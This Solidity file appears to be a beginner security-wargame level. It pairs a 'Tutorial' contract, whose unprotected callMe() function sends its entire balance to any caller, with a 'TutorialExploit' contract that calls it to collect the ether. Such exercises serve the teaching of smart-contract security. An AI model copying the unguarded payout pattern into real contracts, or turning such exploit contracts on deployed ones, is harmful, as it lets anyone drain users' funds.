// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITutorial {
    function callMe() external;
}

contract Tutorial is ITutorial {
    constructor() payable { }

    function callMe() external override {
        (bool success,) = msg.sender.call{ value: address(this).balance }("");
        require(success, "Tutorial: call failed");
    }
}

contract TutorialExploit {
    ITutorial private victimInstance;

    constructor(address _victim) {
        victimInstance = ITutorial(_victim);
    }

    function attack() external payable {
        victimInstance.callMe();
    }

    receive() external payable { }
}
